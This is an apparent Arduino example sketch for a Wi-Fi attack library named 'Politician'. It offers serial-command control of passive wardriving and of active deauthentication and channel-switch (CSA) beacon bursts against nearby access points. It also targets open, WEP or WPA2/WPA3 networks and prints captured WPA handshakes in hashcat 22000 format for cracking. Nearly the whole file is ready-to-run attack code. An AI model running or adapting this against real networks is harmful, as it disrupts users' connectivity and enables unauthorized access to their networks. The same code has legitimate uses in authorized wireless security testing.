#include <Arduino.h>
#include <Politician.h>
#include <PoliticianFormat.h>

politician::Politician engine;

// Callback for when a handshake is successfully captured
void onHandshake(const politician::HandshakeRecord &rec) {
    String hc22000 = politician::format::toHC22000(rec);
    Serial.printf("\n[VICTORY] Handshake Captured!\n%s\n\n", hc22000.c_str());
}

void setup() {
    Serial.begin(115200);
    delay(2000); // Give serial monitor time to connect
    
    Serial.println("===========================================");
    Serial.println(" Politician - Dynamic Runtime Control Demo");
    Serial.println("===========================================");
    Serial.println("Type 'P' to enter Passive Wardriving mode.");
    Serial.println("Type 'A' to enter Active Attack mode (ALL).");
    Serial.println("Type 'C' to use modern CSA bursts only.");
    Serial.println("Type 'D' to use classic Deauth bursts only.");
    Serial.println("Type 'O' to interact ONLY with Open networks.");
    Serial.println("Type 'W' to interact ONLY with WPA2/3 networks.");
    Serial.println("Type 'F' to toggle PCAPNG Capture Filter (Intel vs Handshakes).");
    Serial.println("Type 'I' to toggle WPA3 Immunity Skipping.");
    Serial.println("===========================================\n");

    engine.setLogger([](const char* msg) { Serial.print(msg); });
    engine.setEapolCallback(onHandshake);
    
    // Start strictly Passive by default
    politician::Config cfg;
    cfg.capture_half_handshakes = true; // We want those orphaned M2s!
    cfg.skip_immune_networks = true;    // Dynamically skip WPA3 PMF required networks
    cfg.capture_filter = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES; 
    engine.begin(cfg);
    
    // Completely mute transmissions to start
    engine.setAttackMask(ATTACK_PASSIVE);
    engine.startHopping();
}

void loop() {
    // 1. You must call tick() as fast as possible so the engine can breathe!
    engine.tick();
    
    // 2. A simple mock UI checking for Serial Monitor commands
    if (Serial.available()) {
        char c = Serial.read();
        
        if (c == 'P' || c == 'p') {
            Serial.println("\n[UI] Switching to PASSIVE Mode.");
            engine.setAttackMask(ATTACK_PASSIVE);
            // Speed up the hopper because we aren't pausing to attack
            engine.getConfig().hop_dwell_ms = 200; 
            
        } else if (c == 'A' || c == 'a') {
            Serial.println("\n[UI] Switching to ACTIVE ATTACK Mode (CSA + Deauth).");
            engine.setAttackMask(ATTACK_ALL);
            engine.getConfig().hop_dwell_ms = 400;
            engine.getConfig().csa_beacon_count = 15; 
            engine.getConfig().deauth_burst_count = 20;

        } else if (c == 'C' || c == 'c') {
            Serial.println("\n[UI] Switching to CSA-ONLY Attack Mode.");
            engine.setAttackMask(ATTACK_CSA);
            engine.getConfig().hop_dwell_ms = 400;
            engine.getConfig().csa_beacon_count = 15; 

        } else if (c == 'D' || c == 'd') {
            Serial.println("\n[UI] Switching to DEAUTH-ONLY Attack Mode.");
            engine.setAttackMask(ATTACK_DEAUTH);
            engine.getConfig().hop_dwell_ms = 400;
            engine.getConfig().deauth_burst_count = 30; // Maximize aggressive deauth span

        } else if (c == 'O' || c == 'o') {
            Serial.println("\n[UI] Filter -> Targeting ONLY Open/WEP Networks.");
            // Hot-swap the callback lambda at runtime
            engine.setTargetFilter([](const politician::ApRecord &ap) {
                return (ap.enc < 2); // 0=Open, 1=WEP
            });
            
        } else if (c == 'W' || c == 'w') {
            Serial.println("\n[UI] Filter -> Targeting ONLY WPA2/WPA3 Networks.");
            // Hot-swap the callback lambda at runtime
            engine.setTargetFilter([](const politician::ApRecord &ap) {
                return (ap.enc >= 3); // 3=WPA2/WPA3, 4=Enterprise
            });

        } else if (c == 'F' || c == 'f') {
            if (engine.getConfig().capture_filter == LOG_FILTER_ALL) {
                Serial.println("\n[UI] PCAPNG Filter -> Strict (Handshakes & Probes Only)");
                engine.getConfig().capture_filter = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
            } else {
                Serial.println("\n[UI] PCAPNG Filter -> Maximum Intelligence (ALL FRAMES)");
                engine.getConfig().capture_filter = LOG_FILTER_ALL;
            }

        } else if (c == 'I' || c == 'i') {
            engine.getConfig().skip_immune_networks = !engine.getConfig().skip_immune_networks;
            Serial.printf("\n[UI] WPA3 Immunity Skipping is now: %s\n", 
                engine.getConfig().skip_immune_networks ? "ENABLED" : "DISABLED");
        }
    }
}
